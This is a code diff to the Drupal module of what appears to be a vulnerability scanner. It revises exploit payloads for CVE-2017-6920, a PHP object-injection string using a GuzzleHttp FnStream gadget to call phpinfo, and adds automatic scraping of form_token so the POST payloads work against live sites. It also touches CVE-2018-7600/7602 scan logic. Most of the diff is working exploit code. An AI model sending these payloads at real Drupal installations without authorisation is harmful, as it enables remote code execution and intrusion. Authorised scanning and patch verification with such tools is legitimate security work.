@@ -62,11 +62,11 @@ class Drupal():
         self.cve_2017_6920_payloads = [
             {
                 'path': 'admin/config/development/configuration/single/import',
-                'data': 'config_type=system.simple&config_name=mouse&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token=HxdRhcKEhWWljaPOlYKS8WQvHNRaW3UyJWPGWmPwuKI&form_id=config_single_import_form&op=Import'
+                'data': 'config_type=system.simple&config_name=mouse&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token={}&form_id=config_single_import_form&op=Import'
             },
             {
                 'path': 'config/development/configuration/single/import',
-                'data': 'config_type=system.simple&config_name=mouse&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token=HxdRhcKEhWWljaPOlYKS8WQvHNRaW3UyJWPGWmPwuKI&form_id=config_single_import_form&op=Import'
+                'data': 'config_type=system.simple&config_name=mouse&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token={}&form_id=config_single_import_form&op=Import'
             }
         ]
 
@@ -84,6 +84,25 @@ class Drupal():
                     'data': 'form_build_id='
                 },
             ]
+
+    def get_form_token(self, target, vul_info):
+        ''' 获取drupal的form_token '''
+        res = requests.get(
+            target, 
+            timeout=self.timeout, 
+            headers=self.headers,
+            proxies=self.proxies, 
+            verify=False,
+            allow_redirects=False
+        )
+        logger.logging(vul_info, res.status_code, res)      # * LOG
+        
+        form_token = re.search(r'name="form_token" value=".{43}', res.text, re.I|re.M|re.U|re.S)
+        if (form_token):
+            self.form_token = form_token.group().replace('name="form_token" value="', '')
+            return self.form_token 
+        else:
+            return None
 
     def cve_2018_7600_scan(self, url):
         '''  '''
@@ -132,7 +151,7 @@ class Drupal():
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                     'Method': vul_info['vul_method'],
-                    'Payload': res
+                    'Request': res
                 }
                 return results
 
@@ -185,7 +204,7 @@ class Drupal():
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                     'Method': vul_info['vul_method'],
-                    'Payload': res
+                    'Request': res
                 }
                 return results
 
@@ -193,7 +212,7 @@ class Drupal():
         '''  '''
         vul_info = {}
         vul_info['app_name'] = self.app_name
-        vul_info['vul_type'] = 'unSerialize'
+        vul_info['vul_type'] = 'unSerialize/RCE'
         vul_info['vul_id'] = 'CVE-2017-6920'
         vul_info['vul_method'] = 'POST'
         vul_info['headers'] = {}
@@ -211,6 +230,12 @@ class Drupal():
             vul_info['target'] = target
 
             try:
+                form_token = self.get_form_token(target, vul_info)
+                if (form_token):
+                    data = data.format(form_token)
+                else:
+                    return None
+                
                 res = requests.post(
                     target, 
                     timeout=self.timeout, 
@@ -236,7 +261,7 @@ class Drupal():
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                     'Method': vul_info['vul_method'],
-                    'Payload': res
+                    'Request': res
                 }
                 return results
 
@@ -263,19 +288,9 @@ class Drupal():
 
             try:
                 if payload == 0:                                        # * 当payload为第1个时, 获取form_token
-                    res = requests.get(
-                        target, 
-                        timeout=self.timeout, 
-                        headers=self.headers,
-                        proxies=self.proxies, 
-                        verify=False,
-                        allow_redirects=False
-                    )
-                    logger.logging(vul_info, res.status_code, res)      # * LOG
-                    
-                    form_token = re.search(r'name="form_token" value=".{43}', res.text, re.I|re.M|re.U|re.S)
+                    form_token = self.get_form_token(target, vul_info)
                     if (form_token):
-                        self.form_token = form_token.group().replace('name="form_token" value="', '')
+                        continue
                     else:
                         return None
 
@@ -338,14 +353,12 @@ class Drupal():
                         'Url': url,
                         'Path': self.cve_2018_7602_payloads[1]['path'],
                         'Data': self.cve_2018_7602_payloads[1]['data'].format(self.form_token),
-                        'form_token': self.form_token
                     },
                     'Payload-3': {
                         'Method': 'POST',
                         'Url': url,
                         'Path': path,
                         'Data': data,
-                        'form_build_id': self.form_build_id
                     }
                 }
                 return results
